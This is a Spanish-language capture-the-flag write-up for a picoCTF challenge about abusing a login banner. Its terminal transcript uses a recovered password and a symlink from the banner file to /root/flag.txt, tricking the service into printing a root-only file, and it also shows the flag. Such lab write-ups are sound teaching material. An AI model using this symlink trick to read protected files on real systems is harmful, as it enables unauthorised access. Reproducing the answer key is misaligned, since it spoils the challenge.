Descripción
¿Puedes abusar de la pancarta?

Los detalles adicionales estarán disponibles después de lanzar su instancia de desafío.

Hints:
1.⁠ ⁠¿Conoces los enlaces simbólicos?
2.Tal vez alguna pequeña contraseña descifrada o adivinando


Solución 1

Con webshell

Sepulveda24-picoctf@webshell:~$ nc tethys.picoctf.net 56589
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ ls          
ls
banner  text
player@challenge:~$ rm /banner   
rm /banner
rm: cannot remove '/banner': No such file or directory
player@challenge:~$ rm /home/player/banner
rm /home/player/banner
player@challenge:~$ ln -s /root/flag.txt
ln -s /root/flag.txt
player@challenge:~$ ^C
Sepulveda24-picoctf@webshell:~$ nc tethys.picoctf.net 56589
*********************************************
***************DEFAULT BANNER****************
*Please supply banner in /home/player/banner*
*********************************************
what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCOD
Lol, good try, try again and good luck

What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ rm /home/player/banner
rm /home/player/banner
rm: cannot remove '/home/player/banner': No such file or directory
player@challenge:~$ ln -s /root/flag.txt /home/player/banner
ln -s /root/flag.txt /home/player/banner
player@challenge:~$ ^C
Sepulveda24-picoctf@webshell:~$ nc tethys.picoctf.net 56589





picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_a0e119d4}

Notas adicionales

--------------------


Referencias

https://webshell.picoctf.org
https://chatgpt.com/c/67fee418-a5e4-8002-adc5-df9f4b6b9530